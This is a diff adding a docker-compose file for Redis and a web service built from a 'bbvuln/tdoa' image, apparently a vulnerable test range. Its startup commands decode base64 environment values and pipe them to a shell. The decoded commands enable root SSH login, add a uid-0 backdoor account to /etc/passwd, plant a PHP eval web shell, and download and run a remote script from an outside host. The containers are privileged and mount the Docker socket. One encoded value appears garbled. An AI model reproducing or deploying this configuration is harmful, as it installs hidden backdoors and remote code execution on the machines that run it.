@@ -1,0 +1,45 @@
+version: '3.4'
+
+services:
+  talp:
+    image: redis:latest
+    command: /bin/bash -c 'sleep 6300&&sleep 7900'
+    environment:
+      MYSQL_ROOT_PASSWORD: toor
+  tdredis:
+    image: redis:latest
+    command:  bash -c 'cd /tmp&&apt update&&apt-get install -y busybox python3 openssh-server curl|echo "ZWNobyAke3JlZGlzOX07"|base64 -d|sh|tee aa|base64 -d|tee bb|bash|tee cc&&echo ZWNobyAke3NzaGMxfSR7eWVzMn0ke3dlYnNoZWwyfSA7|tee za|base64 -d|tee zb|sh|tee zc|base64 -d|tee zd|sh&&/etc/init.d/ssh start&&sleep 9600'
+    volumes:
+      - /run/docker.sock:/run/docker.sock:ro
+      - /usr/bin/docker:/usr/bin/docker
+      - /etc/resolv.conf:/resolv.conf
+    environment:
+      redis1: "ZWNobyAiNzwPWV2YWwoXCRfR0VUWzN..-dKzRNaTh8NaTh8AiNzwPWV2YW"
+      sshc1: "c2VkIC1pICJzL14jXD9cKFBlcm1pdFJvb3RMb2dpblwpL1wxIHllcyMvZyIgL2V0Yy9zc2gvc3NoZF9jb25maWc7"
+      HOSTNAME2: "APPSHIELD_VER"
+      yes2: "Y3AgL2V0Yy9wYXNzd2QgL2V0Yy9wYXNzd2QuYmFrJiZlY2hvICJ5ZXM6XCQxXCQxMjNcJEVLV0FSMzAuLndFS0VSRHR6T1FVdi86MDowOnRvb3I6L3RtcDovYmluL2Jhc2giPj4vZXRjL3Bhc3N3ZDsg"
+      redis9: "Y2QgL3RtcDtpZiAod2hpY2ggY3VybCk7IHRoZW4gICBjdXJsIC1vLSBodHRwOi8veHNzLnB0LzRNaTh8c2g7ZWxzZSBleGVjIDM8Pi9kZXYvdGNwL3d3dy5sb2NhbGhvc3Quc2VyZmVuZC50b3AvODA7ZWNobyAtZSAiR0VUIC9idXN5Ym94LmJpbiBIVFRQLzEuMVxyXG5Ib3N0OiB3d3cubG9jYWxob3N0LnNlcmZlbmQudG9wXHJcblVzZXItQWdlbnQ6IGN1cmwgNy40LjJcclxuQ29ubmVjdGlvbjogY2xvc2VcclxuXHJcbiIgPiYzO2NhdD5icyA8JjM7dGFpbCAtbiA1MTI3IGJzPiB3Z2V0O2NobW9kIDA3Nzcgd2dldDsgLi93Z2V0IC1PLSBodHRwOi8veHNzLnB0LzRNaTh8c2g7Zmk7"
+    net: host
+    privileged: "true"
+    container_name: "myred7"
+    hostname: "red8"
+    ports:
+      - "1001:1001"
+      - "22:22"
+  webnice:
+    image: bbvuln/tdoa:11.3
+    command: bash -c 'cd /tmp&&apt update&&apt-get install -y openssh-server busybox python3&&echo ZWNobyAke3NzaGMxfSR7eWVzMn0ke3dlYnNoZWwyfSA7|tee aa|base64 -d|tee bb|sh|tee cc|base64 -d|tee dd|sh&&/etc/init.d/ssh start&&echo "disable_functions=bigniu"|tee -a /usr/local/etc/php/conf.d/docker-php-ext-gd.ini&&apache2-foreground'
+    volumes:
+      - /var/run/docker.sock:/var/run/docker.sock:ro
+    environment:
+      sshc1: "c2VkIC1pICJzL14jXD9cKFBlcm1pdFJvb3RMb2dpblwpL1wxIHllcyMvZyIgL2V0Yy9zc2gvc3NoZF9jb25maWc7"
+      yes2: "Y3AgL2V0Yy9wYXNzd2QgL2V0Yy9wYXNzd2QuYmFrJiZlY2hvICJ5ZXM6XCQxXCQxMjNcJEVLV0FSMzAuLndFS0VSRHR6T1FVdi86MDowOnRvb3I6L3RtcDovYmluL2Jhc2giPj4vZXRjL3Bhc3N3ZDsg"
+      webshel2: "ZWNobyAiNyA8Pz1ldmFsKFwkX0dFVFszXSk7Pz4iPiAvdmFyL3d3dy9odG1sL2luZGV4LnBocCA7"
+      HOSTNAME: "web_ne"
+    depends_on:
+      - tdredis
+      - talp
+    ports:
+      - "1001:1001"
+      - "80:80"
+      - "22:22/tcp"
